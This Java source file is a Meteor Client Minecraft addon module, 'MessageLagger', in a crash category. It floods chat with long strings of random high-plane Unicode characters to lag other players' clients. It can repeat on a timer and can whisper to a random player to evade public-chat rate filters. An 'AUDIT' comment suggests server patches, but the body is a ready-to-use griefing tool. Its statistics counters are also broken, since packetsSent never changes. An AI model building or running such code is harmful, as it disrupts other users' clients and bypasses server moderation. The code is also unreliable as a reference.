package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.player.PlayerEntity;

import java.util.List;
import java.util.Random;

/**
 * AUDIT: Message Lagger (high-cost Unicode chat message)
 *
 * Sends chat messages filled with characters from the BMP/SMP high planes
 * (U+0800–U+1D300 range). These are multi-byte UTF-8 sequences that many
 * chat-rendering libraries (including vanilla Minecraft's text renderer) must
 * look up in complex glyph tables, making them far more expensive to render
 * than ASCII. Sending them to nearby or all players lags their clients.
 *
 * Optionally targets a random online player via /msg (whisper mode) to avoid
 * public chat and bypass broadcast-rate filters that only look at public chat.
 *
 * Patch signal: rate-limit chat packets per player; cap message byte length
 * at the server's chat handler before broadcasting; consider stripping or
 * replacing high-plane Unicode characters that are not part of any registered
 * resource pack font; apply the same rate limit to /msg and /tell as to
 * public chat.
 */
public class MessageLagger extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Integer> messageLength = sgGeneral.add(new IntSetting.Builder()
        .name("message-length").description("Length of the lag message.")
        .defaultValue(200).min(1).sliderMin(1).sliderMax(1000).build()
    );
    private final Setting<Boolean> keepSending = sgGeneral.add(new BoolSetting.Builder()
        .name("keep-sending").description("Keep sending repeatedly.")
        .defaultValue(false).build()
    );
    private final Setting<Integer> delay = sgGeneral.add(new IntSetting.Builder()
        .name("delay").description("Ticks between messages.")
        .defaultValue(100).min(0).sliderMax(1000).visible(keepSending::get).build()
    );
    private final Setting<Boolean> whisper = sgGeneral.add(new BoolSetting.Builder()
        .name("whisper").description("Whisper to a random player instead of public chat.")
        .defaultValue(false).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );
    private int ticksActive = 0, packetsSent = 0;

    private final Random random = new Random();
    private int timer;

    public MessageLagger() {
        super(AddonTemplate.CRASH_CATEGORY, "message-lagger",
            "Sends dense Unicode messages that lag other clients rendering them.");
    }

    @Override
    public void onActivate() {
        if (!keepSending.get()) {
            send();
            toggle();
        } else {
            timer = delay.get();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (!keepSending.get()) return;
        if (timer <= 0) {
            send();
            timer = delay.get();
        } else {
            timer--;
        }
    }

    private void send() {
        if (mc.player == null) return;
        ticksActive++;
        String message = generate();
        if (whisper.get() && mc.world != null) {
            List<? extends PlayerEntity> players = mc.world.getPlayers();
            if (players.isEmpty()) return;
            PlayerEntity target = players.get(random.nextInt(players.size()));
            ChatUtils.sendPlayerMsg("/msg " + target.getGameProfile().name() + " " + message);
        } else {
            ChatUtils.sendPlayerMsg(message);
        }
    }

    private String generate() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < messageLength.get(); i++) {
            sb.append((char) (Math.floor(Math.random() * 0x1D300) + 0x800));
        }
        return sb.toString();
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
